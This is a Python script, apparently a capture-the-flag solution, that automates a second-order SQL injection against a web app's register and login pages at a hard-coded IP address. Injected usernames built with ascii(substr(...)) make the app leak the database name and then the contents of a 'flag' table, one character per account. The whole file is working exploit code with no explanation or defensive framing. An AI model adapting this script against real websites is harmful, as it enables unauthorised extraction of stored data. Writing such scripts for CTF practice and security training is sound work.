import requests
import re
register_url = "http://111.200.241.244:57812/register.php"
login_url = "http://111.200.241.244:57812/login.php"
database = ""
test=r'fasdf\asdf\s*'
table_name = ""
column_name = ""
flag = ""
for i in range(1,15):
    register_data = {
        'email':'test@test'+ str(i),
        'username':"0'+ascii(substr((select database()) from %d for 1))+'0"%i,
        'password':123
        }
    r = requests.post(url=register_url,data=register_data)
    #print(r.text)
    login_data = {
        'email':'test@test'+ str(i),
        'password':123
    }
    r2 = requests.post(url=login_url, data=login_data)
    #print(r.text)
    start=re.search(r'<span class="user-name">\s*(\d*)\s*</span>',r2.text)
    dig=start.group(1)
    if dig== '0':
        break
    database=database +  chr(int(dig))
print(database)
#---------------------------------------------------------------------------------------------
for i in range(1,100):
    register_data = {
        'email': 'test@test' + str(i)+ str(i),
        'username': "0'+ascii(substr((select * from flag) from %d for 1))+'0" % (i),
        'password': 123
    }
    t1 = requests.post(url=register_url, data=register_data)
    # print(r.text)
    login_data = {
        'email': 'test@test' + str(i)+ str(i),
        'password': 123
    }
    t2 = requests.post(url=login_url, data=login_data)
    text1 = re.search(r'<span class="user-name">\s*(\d*)\s*</span>',t2.text)
    dit = text1.group(1)
    if dit == '0':
        break
    else :
        findit = chr(int(dit))
        table_name = table_name + findit
print(f'flag_name:{table_name}')
#---------------------------------------------------------------------------------------------

